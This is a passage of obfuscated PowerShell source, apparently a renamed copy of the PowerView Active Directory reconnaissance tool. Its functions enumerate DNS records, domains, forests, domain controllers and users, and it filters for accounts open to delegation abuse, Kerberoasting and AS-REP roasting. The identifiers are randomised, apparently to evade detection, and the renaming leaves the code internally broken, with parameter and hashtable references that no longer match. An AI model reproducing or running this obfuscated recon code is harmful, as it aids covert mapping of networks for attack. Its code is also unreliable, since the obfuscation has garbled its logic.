                if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $nZuH3szIKVoDJF4Q20.FindOne() }
                else { $nhxRs5G1 = $nZuH3szIKVoDJF4Q20.FindAll() }
                $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                    $TxOjsKu13lUSJ8MHybpYNF = Convert-LDAPProperty -UtHQ $_.Properties
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member NoteProperty 'ZoneName' $TxOjsKu13lUSJ8MHybpYNF.name
                    $TxOjsKu13lUSJ8MHybpYNF.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $TxOjsKu13lUSJ8MHybpYNF
                }
                if ($nhxRs5G1) {
                    try { $nhxRs5G1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $nZuH3szIKVoDJF4Q20.dispose()
        }
    }
}


function Get-DomainDNSRecord {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $2ey6PVwB,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $wtWPex5R = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($2ey6PVwB),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $oBr5ZEne8D = Get-DomainSearcher @SearcherArguments

        if ($oBr5ZEne8D) {
            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $oBr5ZEne8D.FindOne() }
            else { $nhxRs5G1 = $oBr5ZEne8D.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                try {
                    $TxOjsKu13lUSJ8MHybpYNF = Convert-LDAPProperty -UtHQ $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member NoteProperty 'ZoneName' $2ey6PVwB

                    
                    if ($TxOjsKu13lUSJ8MHybpYNF.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        $I4 = Convert-ZKHt4xveu8MJ -ZKHt4xveu8MJ $TxOjsKu13lUSJ8MHybpYNF.dnsrecord[0]
                    }
                    else {
                        $I4 = Convert-ZKHt4xveu8MJ -ZKHt4xveu8MJ $TxOjsKu13lUSJ8MHybpYNF.dnsrecord
                    }

                    if ($I4) {
                        $I4.PSObject.Properties | ForEach-Object {
                            $TxOjsKu13lUSJ8MHybpYNF | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $TxOjsKu13lUSJ8MHybpYNF.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $TxOjsKu13lUSJ8MHybpYNF
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $_"
                    $TxOjsKu13lUSJ8MHybpYNF
                }
            }

            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $_"
                }
            }
            $oBr5ZEne8D.dispose()
        }
    }
}


function Get-3Ecdwi8qNy {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-3Ecdwi8qNy] Using alternate credentials for Get-3Ecdwi8qNy'

            if ($PSBoundParameters['Domain']) {
                $l6OxARucBpbqH124jLlwS = $3Ecdwi8qNy
            }
            else {
                
                $l6OxARucBpbqH124jLlwS = $3ezVSfm6f4k.GetNetworkCredential().Domain
                Write-Verbose "[Get-3Ecdwi8qNy] Extracted domain '$l6OxARucBpbqH124jLlwS' from -3ezVSfm6f4k"
            }

            $vC = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $l6OxARucBpbqH124jLlwS, $3ezVSfm6f4k.UserName, $3ezVSfm6f4k.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($vC)
            }
            catch {
                Write-Verbose "[Get-3Ecdwi8qNy] The specified domain '$l6OxARucBpbqH124jLlwS' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $vC = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $3Ecdwi8qNy)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($vC)
            }
            catch {
                Write-Verbose "[Get-3Ecdwi8qNy] The specified domain '$3Ecdwi8qNy' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-3Ecdwi8qNy] Error retrieving the current domain: $_"
            }
        }
    }
}


function Get-DomainController {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [Switch]
        $iGd10sYkwAJD3Im4rK,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $fzlz3sh2WO9IXgThwdvqMd = @{}
        if ($PSBoundParameters['Domain']) { $fzlz3sh2WO9IXgThwdvqMd['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Credential']) { $fzlz3sh2WO9IXgThwdvqMd['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $fzlz3sh2WO9IXgThwdvqMd['Server'] = $Gkd0Hz5f }

            
            $fzlz3sh2WO9IXgThwdvqMd['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $nlW1d = Get-3Ecdwi8qNy @Arguments
            if ($nlW1d) {
                $nlW1d.DomainControllers
            }
        }
    }
}


function Get-83xk0 {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $83xk0,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[Get-83xk0] Using alternate credentials for Get-83xk0"

            if ($PSBoundParameters['Forest']) {
                $p = $83xk0
            }
            else {
                
                $p = $3ezVSfm6f4k.GetNetworkCredential().Domain
                Write-Verbose "[Get-83xk0] Extracted domain '$83xk0' from -3ezVSfm6f4k"
            }

            $inK1QBxvsIuU7Nphe6 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $p, $3ezVSfm6f4k.UserName, $3ezVSfm6f4k.GetNetworkCredential().Password)

            try {
                $3Q4OMD9 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($inK1QBxvsIuU7Nphe6)
            }
            catch {
                Write-Verbose "[Get-83xk0] The specified forest '$p' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $qYFR5PCZruUkdna9T
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $inK1QBxvsIuU7Nphe6 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $83xk0)
            try {
                $3Q4OMD9 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($inK1QBxvsIuU7Nphe6)
            }
            catch {
                Write-Verbose "[Get-83xk0] The specified forest '$83xk0' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $qYFR5PCZruUkdna9T
            }
        }
        else {
            
            $3Q4OMD9 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($3Q4OMD9) {
            
            if ($PSBoundParameters['Credential']) {
                $onGH = (Get-DomainUser -S "krbtgt" -3Ecdwi8qNy $3Q4OMD9.RootDomain.Name -3ezVSfm6f4k $3ezVSfm6f4k).objectsid
            }
            else {
                $onGH = (Get-DomainUser -S "krbtgt" -3Ecdwi8qNy $3Q4OMD9.RootDomain.Name).objectsid
            }

            $4WL = $onGH -Split '-'
            $onGH = $4WL[0..$($4WL.length-2)] -join '-'
            $3Q4OMD9 | Add-Member NoteProperty 'RootDomainSid' $onGH
            $3Q4OMD9
        }
    }
}


function Get-ForestDomain {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $83xk0,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $fzlz3sh2WO9IXgThwdvqMd = @{}
        if ($PSBoundParameters['Forest']) { $fzlz3sh2WO9IXgThwdvqMd['Forest'] = $83xk0 }
        if ($PSBoundParameters['Credential']) { $fzlz3sh2WO9IXgThwdvqMd['Credential'] = $3ezVSfm6f4k }

        $3Q4OMD9 = Get-83xk0 @Arguments
        if ($3Q4OMD9) {
            $3Q4OMD9.Domains
        }
    }
}


function Get-ForestGlobalCatalog {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $83xk0,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $fzlz3sh2WO9IXgThwdvqMd = @{}
        if ($PSBoundParameters['Forest']) { $fzlz3sh2WO9IXgThwdvqMd['Forest'] = $83xk0 }
        if ($PSBoundParameters['Credential']) { $fzlz3sh2WO9IXgThwdvqMd['Credential'] = $3ezVSfm6f4k }

        $3Q4OMD9 = Get-83xk0 @Arguments

        if ($3Q4OMD9) {
            $3Q4OMD9.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $9KvtU3h,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $83xk0,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $fzlz3sh2WO9IXgThwdvqMd = @{}
        if ($PSBoundParameters['Forest']) { $fzlz3sh2WO9IXgThwdvqMd['Forest'] = $83xk0 }
        if ($PSBoundParameters['Credential']) { $fzlz3sh2WO9IXgThwdvqMd['Credential'] = $3ezVSfm6f4k }

        $3Q4OMD9 = Get-83xk0 @Arguments

        if ($3Q4OMD9) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($4QFniXVTa1MAD04QWu1OUT in $9KvtU3h) {
                    $3Q4OMD9.Schema.FindClass($4QFniXVTa1MAD04QWu1OUT)
                }
            }
            else {
                $3Q4OMD9.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $9KvtU3h,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $DLuXz7PBhG3Q8ErUgi,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $g1iWd3E5YN,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $R2LmqPl1H4nSJafvl82 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $isye0Z = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $hWxkM8Ay6gQdfeLoln = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $p = Get-3Ecdwi8qNy -3Ecdwi8qNy $3Ecdwi8qNy | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $p = Get-3Ecdwi8qNy -3Ecdwi8qNy $3Ecdwi8qNy -3ezVSfm6f4k $3ezVSfm6f4k | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$p' for target domain '$3Ecdwi8qNy'"
        }

        $H9I7GZiXKd14jlAgY = @{}
        if ($PSBoundParameters['Credential']) { $H9I7GZiXKd14jlAgY['Credential'] = $3ezVSfm6f4k }
        if ($p) {
            $H9I7GZiXKd14jlAgY['Forest'] = $p
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -DLuXz7PBhG3Q8ErUgi"
            $XeFPlb84WvJwjNtT1BEm9Zz = $DLuXz7PBhG3Q8ErUgi
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -g1iWd3E5YN to use as the reference property set"
            $XeFPlb84WvJwjNtT1BEm9Zz = Get-Member -h92XtEowmqi $g1iWd3E5YN -MemberType NoteProperty | Select-Object -Expand Name
            $SDQquGD0ZQRNhV = $g1iWd3E5YN.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $SDQquGD0ZQRNhV"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$9KvtU3h'"
        }

        if (($9KvtU3h -eq 'User') -or ($SDQquGD0ZQRNhV -eq 'User')) {
            $1wXB0wBd7JWEKgmLEf6 = Get-DomainUser @SearcherArguments
            if (-not $XeFPlb84WvJwjNtT1BEm9Zz) {
                $XeFPlb84WvJwjNtT1BEm9Zz = $R2LmqPl1H4nSJafvl82
            }
        }
        elseif (($9KvtU3h -eq 'Group') -or ($SDQquGD0ZQRNhV -eq 'Group')) {
            $1wXB0wBd7JWEKgmLEf6 = Get-DomainGroup @SearcherArguments
            if (-not $XeFPlb84WvJwjNtT1BEm9Zz) {
                $XeFPlb84WvJwjNtT1BEm9Zz = $isye0Z
            }
        }
        elseif (($9KvtU3h -eq 'Computer') -or ($SDQquGD0ZQRNhV -eq 'Computer')) {
            $1wXB0wBd7JWEKgmLEf6 = Get-DomainComputer @SearcherArguments
            if (-not $XeFPlb84WvJwjNtT1BEm9Zz) {
                $XeFPlb84WvJwjNtT1BEm9Zz = $hWxkM8Ay6gQdfeLoln
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $9KvtU3h"
        }

        ForEach ($jp9jiurTsXvElqD in $1wXB0wBd7JWEKgmLEf6) {
            $HdwkM6u9Qz4cxeONFJY2hfpg = Get-Member -h92XtEowmqi $jp9jiurTsXvElqD -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($PUmwZLDUuT0dY5 in $HdwkM6u9Qz4cxeONFJY2hfpg) {
                if ($XeFPlb84WvJwjNtT1BEm9Zz -NotContains $PUmwZLDUuT0dY5) {
                    $TxOjsKu13lUSJ8MHybpYNF = New-Object PSObject
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'SamAccountName' $jp9jiurTsXvElqD.SamAccountName
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'Property' $PUmwZLDUuT0dY5
                    $TxOjsKu13lUSJ8MHybpYNF | Add-Member Noteproperty 'Value' $jp9jiurTsXvElqD.$PUmwZLDUuT0dY5
                    $TxOjsKu13lUSJ8MHybpYNF.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $TxOjsKu13lUSJ8MHybpYNF
                }
            }
        }
    }
}








function Get-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [Switch]
        $LCkz1xqdPM7K4jH,

        [Switch]
        $Qry1ged2hMaqkv,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $MgOWUCB0xKro2Y6fTEQdm1,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $t9NU58YsV7ZX,

        [Switch]
        $EcWeglztmPXo7B0bGhH,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $WGZtCSNSvt6ckOHo36dLfOWs9,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $Z8qdyPlzVkp4RigJ71,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Alias('ReturnOne')]
        [Switch]
        $Lnzs4NIWklS,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    DynamicParam {
        $71kMm1caDM3d = [Enum]::GetNames($KLrjblEyzposuH)
        
        $71kMm1caDM3d = $71kMm1caDM3d | ForEach-Object {$_; "NOT_$_"}
        
        New-DynamicParameter -TwsV1 UACFilter -g4C3L1BXaM $71kMm1caDM3d -fK67iX ([array])
    }

    BEGIN {
        $wtWPex5R = @{}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['Properties']) { $wtWPex5R['Properties'] = $UtHQ }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['SecurityMasks']) { $wtWPex5R['SecurityMasks'] = $Z8qdyPlzVkp4RigJ71 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
        $XK77F5ap = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($XK77F5ap) {
            $CO2KFH = ''
            $Iq7bLVAvhKnpjdMlH2 = ''
            $S | Where-Object {$_} | ForEach-Object {
                $It59GzvwEj = $_.Replace('(', '\28').Replace(')', '\29')
                if ($It59GzvwEj -match '^S-1-') {
                    $CO2KFH += "(objectsid=$It59GzvwEj)"
                }
                elseif ($It59GzvwEj -match '^CN=') {
                    $CO2KFH += "(distinguishedname=$It59GzvwEj)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $23DM = $It59GzvwEj.SubString($It59GzvwEj.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$23DM' from '$It59GzvwEj'"
                        $wtWPex5R['Domain'] = $23DM
                        $XK77F5ap = Get-DomainSearcher @SearcherArguments
                        if (-not $XK77F5ap) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$23DM'"
                        }
                    }
                }
                elseif ($It59GzvwEj -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ypHo7v = (([Guid]$It59GzvwEj).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $CO2KFH += "(objectguid=$ypHo7v)"
                }
                elseif ($It59GzvwEj.Contains('\')) {
                    $4QsEpCvyLO6c2atiUjSo5R = $It59GzvwEj.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -YSu8jzco2Jt Canonical
                    if ($4QsEpCvyLO6c2atiUjSo5R) {
                        $hZmS = $4QsEpCvyLO6c2atiUjSo5R.SubString(0, $4QsEpCvyLO6c2atiUjSo5R.IndexOf('/'))
                        $mOi9D = $It59GzvwEj.Split('\')[1]
                        $CO2KFH += "(samAccountName=$mOi9D)"
                        $wtWPex5R['Domain'] = $hZmS
                        Write-Verbose "[Get-DomainUser] Extracted domain '$hZmS' from '$It59GzvwEj'"
                        $XK77F5ap = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $CO2KFH += "(samAccountName=$It59GzvwEj)"
                }
            }

            if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $Iq7bLVAvhKnpjdMlH2 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                
                $Iq7bLVAvhKnpjdMlH2 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $Iq7bLVAvhKnpjdMlH2 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $Iq7bLVAvhKnpjdMlH2 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $Iq7bLVAvhKnpjdMlH2 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $Iq7bLVAvhKnpjdMlH2 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $c7rZO2V9"
                $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
            }

            
            $F2EgMO8Q | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $r3NzqZ3LuCdUjNUAWy5yroT = $_.Substring(4)
                    $Jwv4XHmkge9naNIru5oT = [Int]($KLrjblEyzposuH::$r3NzqZ3LuCdUjNUAWy5yroT)
                    $Iq7bLVAvhKnpjdMlH2 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$Jwv4XHmkge9naNIru5oT))"
                }
                else {
                    $Jwv4XHmkge9naNIru5oT = [Int]($KLrjblEyzposuH::$_)
